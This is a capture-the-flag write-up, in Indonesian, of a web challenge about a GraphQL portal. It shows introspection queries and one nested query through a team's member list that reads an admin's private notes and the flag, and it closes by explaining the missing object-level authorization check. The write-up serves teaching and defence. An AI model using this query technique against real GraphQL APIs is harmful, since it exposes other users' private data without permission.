# The Shape of a Query

| | |
|---|---|
| **Bagian** | wave 1 |
| **Kategori** | web |
| **Jumlah Solve** | 764 |

## Ikhtisar

Portalnya adalah API GraphQL dan tertulis demikian di halaman depan:

```
# Welcome to the portal.
# Introspection is enabled — start by exploring the schema.
```

Jadi pertanyaan pertama adalah introspeksi ditambah pemeriksaan kewarasan pada sesi tersebut:

```graphql
{
  me { id username role }
  __schema { types { name } }
  user(id: "1") { id username }
}
```

`me` mengembalikan `user_1814` / `MEMBER`, skema mencantumkan `Query`, `User`, `Team` dan `UserRoleEnum`, dan `user(id: "1")` adalah `null`.

Introspeksi kedua jenis objek memberikan gambaran lengkap:

```graphql
{
  __type(name: "Query") {
    fields { name args { name type { kind ofType { name } } } }
  }
}
```

Akar kueri memiliki dua bidang: `me` dan `user(id: ID!)`. Dan pada `User`:

```graphql
{
  __type(name: "User") {
    fields { name type { name kind ofType { name } } }
  }
}
```

`id`, `username`, `role`, `team` dan — yang menarik — `privateNotes: String`. Membaca sendiri akan menghasilkan umpan: `"Grocery list, personal reminders. Nothing worth reading."`

`Team` melengkapi peta dengan `id`, `name` dan `members: [User]`.

## Penyelesaian

Langkah yang jelas adalah menghitung ID pengguna melalui `user(id: ...)`. Tidak ada gunanya: `user(id: "1")` dan `user(id: "user_0")` keduanya mengembalikan `null`, dan skemanya bahkan tidak konsisten — akun kami adalah `user_1814` tetapi adminnya adalah `admin_1814`, jadi memaksa `user_N` tidak akan pernah mencapainya. Ruang ID adalah dinding.

Skemanya menunjuk ke tempat yang lebih baik. `Team.members` mengembalikan daftar objek `User`, yang berarti server menyelesaikan pengguna lain untuk kami, dan `User.privateNotes` adalah skalar biasa tanpa logika visibilitas yang melekat padanya. Otorisasi diterapkan, jika ada, pada akar kueri: `me` dicakup ke pemanggil dan `user(id:)` memfilter apa yang dapat Anda minta. Tidak ada yang memeriksa objek `User` yang dijangkau *melalui relasi* selain melalui root.

Jadi keseluruhan tantangannya adalah satu kueri yang mengikuti grafik:

```graphql
{
  me {
    team {
      members {
        id
        username
        role
        privateNotes
      }
    }
  }
}
```

Responsnya berisi dua anggota, kami dan admin:

```json
{
  "members": [
    {
      "id": "user_1814",
      "role": "MEMBER",
      "privateNotes": "Grocery list, personal reminders. Nothing worth reading."
    },
    {
      "id": "admin_1814",
      "role": "ADMIN",
      "privateNotes": "POCTF{...}"
    }
  ]
}
```

Flag-nya ada di catatan admin.

Introspeksi bukanlah kerentanan, melainkan peta: introspeksi mengubah pencarian ID secara buta menjadi sebuah keunggulan yang dapat diikuti. Bug sebenarnya adalah otorisasi tingkat objek berada pada titik masuk kueri dan bukan pada penyelesai lapangan, sehingga relasi apa pun bertindak sebagai jalan keluarnya. Cek tersebut ada di `User.privateNotes` (atau di `Team.members`), dengan keputusannya adalah "bolehkah penelepon ini melihat pengguna spesifik ini", bukan "pengguna mana yang mungkin diminta oleh penelepon ini".